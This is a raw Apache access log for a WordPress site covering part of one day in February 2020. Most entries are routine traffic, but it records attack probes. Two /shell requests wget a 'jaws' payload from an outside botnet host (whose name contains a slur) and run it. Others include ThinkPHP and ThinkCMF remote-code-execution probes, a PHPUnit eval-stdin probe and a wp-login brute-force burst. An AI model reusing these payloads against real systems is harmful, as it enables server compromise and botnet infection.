104.238.117.191 - - [16/Feb/2020:04:19:46 -0700] "POST /wp-cron.php?doing_wp_cron=1581851986.9810280799865722656250 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581851986.9810280799865722656250" "WordPress/5.3.2; http://datostech.com"
98.225.141.2 - - [16/Feb/2020:04:19:46 -0700] "GET / HTTP/1.1" 301 - "-" "-"
94.177.153.12 - - [16/Feb/2020:04:25:57 -0700] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://jhasdjahsdjasfkdaskdfasBOT.niggacumyafacenet.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 301 - "-" "Hello, world"
127.0.0.1 - - [16/Feb/2020:04:31:42 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
5.255.174.141 - - [16/Feb/2020:04:38:54 -0700] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
5.255.174.141 - - [16/Feb/2020:04:38:55 -0700] "GET / HTTP/1.1" 200 26732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
106.12.69.27 - - [16/Feb/2020:04:40:24 -0700] "-" 408 - "-" "-"
5.101.0.209 - - [16/Feb/2020:04:41:01 -0700] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.101.0.209 - - [16/Feb/2020:04:41:02 -0700] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 17803 "http://104.238.117.191:80/solr/admin/info/system?wt=json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:04:47:15 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:04:47:23 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
5.101.0.209 - - [16/Feb/2020:04:48:25 -0700] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.101.0.209 - - [16/Feb/2020:04:48:27 -0700] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:04:52:50 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:04:52:57 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:04:55:00 -0700] "POST /wp-cron.php?doing_wp_cron=1581854100.9323449134826660156250 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581854100.9323449134826660156250" "WordPress/5.3.2; http://datostech.com"
5.101.0.209 - - [16/Feb/2020:04:55:00 -0700] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 200 18002 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.100.85.101 - - [16/Feb/2020:04:58:28 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
185.100.85.101 - - [16/Feb/2020:04:58:29 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
185.100.85.101 - - [16/Feb/2020:04:58:32 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
104.238.117.191 - - [16/Feb/2020:05:23:13 -0700] "POST /wp-cron.php?doing_wp_cron=1581855793.7669858932495117187500 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581855793.7669858932495117187500" "WordPress/5.3.2; http://datostech.com"
52.38.192.195 - - [16/Feb/2020:05:23:13 -0700] "GET / HTTP/1.1" 200 26732 "-" "Go-http-client/1.1"
65.99.152.25 - - [16/Feb/2020:05:25:16 -0700] "GET /index.php?s=/index/ hink" 400 332 "-" "-"
127.0.0.1 - - [16/Feb/2020:05:36:22 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
80.82.77.192 - - [16/Feb/2020:05:40:56 -0700] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 zgrab/0.x"
36.72.204.241 - - [16/Feb/2020:05:41:19 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:20 -0700] "POST /wp-login.php HTTP/1.1" 200 7334 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:21 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:21 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:22 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:23 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:24 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:25 -0700] "POST /wp-login.php HTTP/1.1" 200 8017 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:26 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:27 -0700] "POST /wp-login.php HTTP/1.1" 200 8012 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:28 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:29 -0700] "POST /wp-login.php HTTP/1.1" 200 8026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:30 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:31 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:32 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:32 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:33 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:34 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:35 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.72.204.241 - - [16/Feb/2020:05:41:36 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
127.0.0.1 - - [16/Feb/2020:05:41:54 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:05:41:55 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:06:03:02 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:06:03:03 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:06:03:04 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
181.92.130.78 - - [16/Feb/2020:06:13:05 -0700] "GET /shell?busybox HTTP/1.1" 400 332 "-" "Mozilla/5.0"
104.238.117.191 - - [16/Feb/2020:06:19:13 -0700] "POST /wp-cron.php?doing_wp_cron=1581859153.3171980381011962890625 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581859153.3171980381011962890625" "WordPress/5.3.2; http://datostech.com"
92.242.198.101 - - [16/Feb/2020:06:19:12 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
84.138.16.24 - - [16/Feb/2020:06:22:35 -0700] "GET / HTTP/1.1" 400 332 "-" "-"
84.138.16.24 - - [16/Feb/2020:06:22:35 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:06:47:26 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:06:47:27 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:06:53:01 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:06:53:02 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:06:59:37 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:07:00:13 -0700] "POST /wp-cron.php?doing_wp_cron=1581861613.9467580318450927734375 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581861613.9467580318450927734375" "WordPress/5.3.2; http://datostech.com"
193.106.30.99 - - [16/Feb/2020:07:00:13 -0700] "POST /jss.php HTTP/1.1" 404 17752 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:07:03:42 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:07:03:43 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:07:07:17 -0700] "POST /wp-cron.php?doing_wp_cron=1581862037.6007668972015380859375 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581862037.6007668972015380859375" "WordPress/5.3.2; http://datostech.com"
176.213.6.185 - - [16/Feb/2020:07:07:17 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.68"
176.213.6.185 - - [16/Feb/2020:07:07:18 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.68"
176.213.6.185 - - [16/Feb/2020:07:07:19 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.68"
104.238.117.191 - - [16/Feb/2020:07:11:50 -0700] "POST /wp-cron.php?doing_wp_cron=1581862310.5730600357055664062500 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581862310.5730600357055664062500" "WordPress/5.3.2; http://datostech.com"
169.197.108.38 - - [16/Feb/2020:07:11:50 -0700] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
169.197.108.38 - - [16/Feb/2020:07:11:51 -0700] "GET / HTTP/1.1" 200 26732 "http://104.238.117.191/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
93.94.186.51 - - [16/Feb/2020:07:15:27 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
136.228.129.90 - - [16/Feb/2020:07:17:28 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
213.73.9.194 - - [16/Feb/2020:07:39:29 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
5.38.151.48 - - [16/Feb/2020:07:46:43 -0700] "{D79E94C5-70F0" 400 332 "-" "-"
104.238.117.191 - - [16/Feb/2020:07:54:28 -0700] "POST /wp-cron.php?doing_wp_cron=1581864868.8451590538024902343750 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581864868.8451590538024902343750" "WordPress/5.3.2; http://datostech.com"
107.172.1.127 - - [16/Feb/2020:07:54:28 -0700] "GET / HTTP/1.1" 200 26732 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2597.57"
127.0.0.1 - - [16/Feb/2020:08:00:30 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:08:01:26 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:08:01:27 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:08:31:02 -0700] "POST /wp-cron.php?doing_wp_cron=1581867062.4294939041137695312500 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581867062.4294939041137695312500" "WordPress/5.3.2; http://datostech.com"
178.17.177.44 - - [16/Feb/2020:08:31:02 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
178.17.177.44 - - [16/Feb/2020:08:31:03 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
178.17.177.44 - - [16/Feb/2020:08:31:07 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
185.86.13.213 - - [16/Feb/2020:08:39:12 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.13.213 - - [16/Feb/2020:08:39:13 -0700] "POST /wp-login.php HTTP/1.1" 200 7464 "http://www.datostech.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.13.213 - - [16/Feb/2020:08:39:14 -0700] "POST /wp-login.php HTTP/1.1" 200 7334 "http://www.datostech.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:08:45:13 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:08:55:52 -0700] "POST /wp-cron.php?doing_wp_cron=1581868552.3069469928741455078125 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581868552.3069469928741455078125" "WordPress/5.3.2; http://datostech.com"
188.116.12.124 - - [16/Feb/2020:08:55:51 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "http://datostech.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
188.116.12.124 - - [16/Feb/2020:08:56:00 -0700] "POST /wp-login.php HTTP/1.1" 200 7334 "http://datostech.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
178.159.37.85 - - [16/Feb/2020:09:10:18 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
178.159.37.85 - - [16/Feb/2020:09:10:19 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
178.159.37.85 - - [16/Feb/2020:09:10:20 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:09:14:36 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:09:35:36 -0700] "POST /wp-cron.php?doing_wp_cron=1581870936.3111319541931152343750 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581870936.3111319541931152343750" "WordPress/5.3.2; http://datostech.com"
107.6.171.130 - - [16/Feb/2020:09:35:35 -0700] "GET / HTTP/1.1" 200 26732 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
128.199.145.27 - - [16/Feb/2020:09:47:25 -0700] "GET /index.php?s=/index/ hink" 400 332 "-" "-"
76.69.94.118 - - [16/Feb/2020:09:49:07 -0700] "GET / HTTP/1.1" 400 332 "-" "-"
104.238.117.191 - - [16/Feb/2020:10:10:58 -0700] "POST /wp-cron.php?doing_wp_cron=1581873058.7809960842132568359375 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581873058.7809960842132568359375" "WordPress/5.3.2; http://datostech.com"
220.181.51.74 - - [16/Feb/2020:10:10:58 -0700] "GET / HTTP/1.1" 200 26732 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
111.206.198.195 - - [16/Feb/2020:10:11:00 -0700] "GET /wp-includes/css/dist/block-library/style.min.css?ver=5.3.2 HTTP/1.1" 200 41467 "http://datostech.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
95.213.193.200 - - [16/Feb/2020:10:13:03 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
95.213.193.200 - - [16/Feb/2020:10:13:04 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
95.213.193.200 - - [16/Feb/2020:10:13:05 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:10:29:13 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
93.100.153.184 - - [16/Feb/2020:10:30:50 -0700] "GET / HTTP/1.0" 200 26732 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:10:43:52 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:10:50:06 -0700] "POST /wp-cron.php?doing_wp_cron=1581875406.5054430961608886718750 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581875406.5054430961608886718750" "WordPress/5.3.2; http://datostech.com"
146.247.25.82 - - [16/Feb/2020:10:50:06 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36"
146.247.25.82 - - [16/Feb/2020:10:50:07 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36"
146.247.25.82 - - [16/Feb/2020:10:50:08 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:11:05:52 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:11:35:57 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:11:35:58 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:11:42:03 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
185.202.0.22 - - [16/Feb/2020:11:49:16 -0700] "\x03" 400 332 "-" "-"
127.0.0.1 - - [16/Feb/2020:11:49:16 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:12:16:38 -0700] "POST /wp-cron.php?doing_wp_cron=1581880598.3573050498962402343750 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581880598.3573050498962402343750" "WordPress/5.3.2; http://datostech.com"
5.101.0.209 - - [16/Feb/2020:12:16:37 -0700] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.64.147.83 - - [16/Feb/2020:12:31:30 -0700] "GET /index.php?s=/index/ hink" 400 332 "-" "-"
59.115.159.247 - - [16/Feb/2020:12:39:41 -0700] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://jhasdjahsdjasfkdaskdfasBOT.niggacumyafacenet.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 301 - "-" "Hello, world"
104.238.117.191 - - [16/Feb/2020:12:39:41 -0700] "POST /wp-cron.php?doing_wp_cron=1581881981.4421761035919189453125 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581881981.4421761035919189453125" "WordPress/5.3.2; http://datostech.com"
104.238.117.191 - - [16/Feb/2020:12:44:05 -0700] "POST /wp-cron.php?doing_wp_cron=1581882245.0420210361480712890625 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581882245.0420210361480712890625" "WordPress/5.3.2; http://datostech.com"
45.83.65.182 - - [16/Feb/2020:12:44:04 -0700] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
2.183.209.179 - - [16/Feb/2020:12:44:14 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
82.117.194.229 - - [16/Feb/2020:12:45:26 -0700] "GET /en/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
82.117.194.229 - - [16/Feb/2020:12:45:27 -0700] "GET /en/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
127.0.0.1 - - [16/Feb/2020:12:47:25 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:12:49:21 -0700] "POST /wp-cron.php?doing_wp_cron=1581882561.2818579673767089843750 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581882561.2818579673767089843750" "WordPress/5.3.2; http://datostech.com"
54.190.136.246 - - [16/Feb/2020:12:49:20 -0700] "GET / HTTP/1.1" 200 26732 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:12:58:55 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
